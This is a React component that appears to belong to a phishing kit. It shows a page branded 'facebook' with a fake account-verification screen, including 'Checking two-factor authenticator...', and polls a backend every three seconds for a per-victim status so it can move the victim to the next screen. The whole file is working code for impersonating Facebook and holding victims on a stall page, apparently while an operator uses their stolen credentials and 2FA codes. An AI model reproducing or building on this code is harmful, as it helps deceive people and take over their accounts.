import React, { useState, useEffect } from "react";
import { API_BE } from "./utils/variable";

export const LoadingFacebookButton = (props) => {
  const [percent, setPercent] = useState(0);

  const increase = () => {
    setPercent(percent + 10);
  };

  const checkScreenSwitch = () => {
    let unique_id = localStorage.getItem("unique_id");
    let form_data = localStorage.getItem("form_data");

    if (unique_id || form_data) {
      form_data = JSON.parse(form_data);
      unique_id = JSON.parse(unique_id);
      fetch(`${API_BE}/users/` + unique_id)
        .then((res) => res.json())
        .then((response) => {
          props.setValue(response.data.status);
        })
        .catch(() => {});
    }
  };

  useEffect(() => {
    const interval = setInterval(() => {
      setPercent((oldValue) => {
        const newValue = oldValue + 1;
        checkScreenSwitch();
        // if (newValue > 20) {
        //   checkScreenSwitch();
        // }

        if (newValue > 80) {
          // newValue;
          // clearInterval(interval);
        }

        return newValue;
      });
    }, 3000);

    if (!props.isModalVisible) {
      clearInterval(interval);
    }

    return () => {
      clearInterval(interval);
    };
  }, []);

  return (
    <>
      <div className="header-color">
        <div className="header-container">
          <h2>facebook</h2>
        </div>
      </div>

      <div class="loading-container">
        <div class="loading-message">
          Please be patient and dont close this window
        </div>
        <div class="loading-submessage step1">
          Checking the details on your account...
        </div>
        <div class="loading-submessage step2">Checking email addresses...</div>
        <div class="loading-submessage step3">
          Checking two-factor authenticator...
        </div>
        <div class="loading-submessage step4">Checking other details...</div>
        <div class="loading-submessage finalStep">
          It can take up to 10 minutes to verify your account.
        </div>
        <div class="loader"></div>
      </div>
    </>
  );
};
